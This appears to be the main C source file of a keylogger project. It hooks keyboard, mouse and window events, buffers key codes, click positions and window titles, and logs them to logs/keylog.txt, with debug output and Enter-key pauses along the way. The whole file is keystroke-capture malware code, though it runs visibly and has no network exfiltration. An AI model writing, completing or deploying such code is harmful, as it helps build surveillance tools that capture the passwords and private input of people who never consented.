#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include "hooks.h"
#include "buffer.h"
#include "logger.h"
#include "utils.h"

static volatile int running = 1;

// Callback function for hook events
static void event_callback(const Event* event) {
    if (!event) return;
    
    printf("Event received: type=%d\n", event->type);

    char event_data[1024];
    switch(event->type) {
        case EVENT_KEY_PRESS:
            printf("Key Press Detected: %u\n", event->data.keyboard.vkCode);
            snprintf(event_data, sizeof(event_data), "Key Press: %u\n", 
                    event->data.keyboard.vkCode);
            break;
        case EVENT_MOUSE_CLICK:
            printf("Mouse Click Detected: (%d, %d)\n",
                   event->data.mouse.position.x, event->data.mouse.position.y);
            snprintf(event_data, sizeof(event_data), "Mouse Click: (%d, %d)\n", 
                    event->data.mouse.position.x, event->data.mouse.position.y);
            break;
        case EVENT_WINDOW_CHANGE:
            snprintf(event_data, sizeof(event_data), "Window Change: %s\n", 
                    event->data.window.title);
            break;
        default:
            return;
    }
    
    add_to_buffer(event_data, strlen(event_data));
}

void cleanup_handler(int signum) {
    printf("Signal received: %d. Setting running to 0.\n", signum);
    running = 0;
}

int main() {
    printf("Keylogger starting...\n");
    signal(SIGINT, cleanup_handler);
    signal(SIGTERM, cleanup_handler);

    // Initialize components
    if (!init_hooks(event_callback)) { 
        fprintf(stderr, "Failed to initialize hooks\n");
        printf("[DEBUG] init_hooks failed\n");
        return 1;
    }

    if (!init_buffer()) {
        cleanup_hooks();
        fprintf(stderr, "Failed to initialize buffer\n");
        printf("[DEBUG] init_buffer failed\n");
        return 1;
    }

    printf("[DEBUG] init_buffer succeeded. Press Enter to continue...\n");
    getchar();

    if (!init_logger("logs/keylog.txt")) {
        cleanup_buffer();
        cleanup_hooks();
        fprintf(stderr, "Failed to initialize logger\n");
        printf("[DEBUG] init_logger failed\n");
        return 1;
    }

    printf("[DEBUG] init_logger succeeded. Press Enter to continue...\n");
    getchar();
    printf("Keylogger started. Press Ctrl+C to exit.\n");

    while (running) {
        printf("[DEBUG] Keylogger running...\n");
        if (!process_events()) {
            printf("[DEBUG] process_events returned false\n");
        } else {
            printf("[DEBUG] Events processed successfully\n");
        }
        flush_buffer_if_needed();
        Sleep(10);
    }

    printf("\nShutting down...\n");
    cleanup_logger();
    cleanup_buffer();
    cleanup_hooks();

    return 0;
}